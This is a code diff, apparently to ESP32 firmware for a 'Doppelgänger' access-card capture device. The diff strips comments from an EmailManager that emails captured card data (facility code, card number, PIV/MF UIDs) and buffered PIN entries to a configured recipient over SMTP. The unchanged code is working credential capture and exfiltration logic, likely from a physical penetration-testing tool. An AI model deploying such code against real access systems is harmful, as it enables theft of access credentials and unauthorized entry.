@@ -83,19 +83,16 @@ bool EmailManager::sendCardData(uint8_t bitCount, uint32_t facilityCode, uint32_
     // Format subject line
     if (bitCount == 32 && facilityCode >= 256)
     {
-        // PIV/MF card format
         msg.subject = "PIV/MF Card Read - UID: " + reversedPairsUID;
     }
     else
     {
-        // Standard card format
         char subject[100];
         snprintf(subject, sizeof(subject), "Card Read: %d-bit, FC: %lu, CN: %lu",
                  bitCount, facilityCode, cardNumber);
         msg.subject = subject;
     }
 
-    // Format email body
     char timeStr[32];
     struct tm timeinfo;
     localtime_r(&msg.timestamp, &timeinfo);
@@ -103,7 +100,6 @@ bool EmailManager::sendCardData(uint8_t bitCount, uint32_t facilityCode, uint32_
 
     if (bitCount == 32 && facilityCode >= 256)
     {
-        // PIV/MF card format
         char body[1024];
         snprintf(body, sizeof(body),
                  "The following card data was captured at %s\n"
@@ -134,7 +130,6 @@ bool EmailManager::sendCardData(uint8_t bitCount, uint32_t facilityCode, uint32_
         msg.body = body;
     }
 
-    // Add to queue
     std::lock_guard<std::mutex> lock(queueMutex);
     messageQueue.push(msg);
 
@@ -150,8 +145,7 @@ void EmailManager::emailTaskFunction(void *parameter)
     {
         if (manager->processNextEmail())
         {
-            // Successfully processed an email
-            vTaskDelay(pdMS_TO_TICKS(1000)); // Wait before next email
+            vTaskDelay(pdMS_TO_TICKS(1000));
         }
         else
         {
@@ -172,7 +166,6 @@ bool EmailManager::processNextEmail()
     EmailMessage msg = messageQueue.front();
     messageQueue.pop();
 
-    // Send email
     if (sendEmail(smtp_recipient, msg.subject.c_str(), msg.body.c_str()))
     {
         logger.log("[EMAIL] Email sent successfully");
@@ -206,7 +199,6 @@ bool EmailManager::sendEmail(const char *to, const char *subject, const char *bo
 
     logger.log("[EMAIL] Connected to SMTP server");
 
-    // Wait for greeting
     if (!waitForResponse(client, "220"))
     {
         logger.log("[EMAIL] No greeting from server");
@@ -411,7 +403,6 @@ void EmailManager::sendPinData(const String &pinCode, const String &ssid, const 
         delay(50); // Small delay to ensure reliable PIN entry
     }
 
-    // Add to PIN buffer
     pinBuffer += pinCode;
     lastPinTime = millis();
 }
@@ -448,13 +439,11 @@ void EmailManager::flushPinBuffer(const String &ssid)
     msg.body += "------------------\n";
     msg.body += "This message was sent from a Doppelgänger device that was connected to " + ssid + "\n";
 
-    // Add to queue
     std::lock_guard<std::mutex> lock(queueMutex);
     messageQueue.push(msg);
 
     logger.log("[EMAIL] Added PIN sequence email to queue");
 
-    // Clear the buffer
     pinBuffer = "";
     lastPinTime = 0;
 }
@@ -521,12 +510,10 @@ void EmailManager::readConfig()
 
 void EmailManager::update()
 {
-    // Check if we need to flush the PIN buffer - increased timeout to 2 seconds
     if (!pinBuffer.isEmpty() && (millis() - lastPinTime >= 2000))
     {
         flushPinBuffer(WiFi.SSID());
     }
 }
 
-// Create global instance
 EmailManager emailManager;
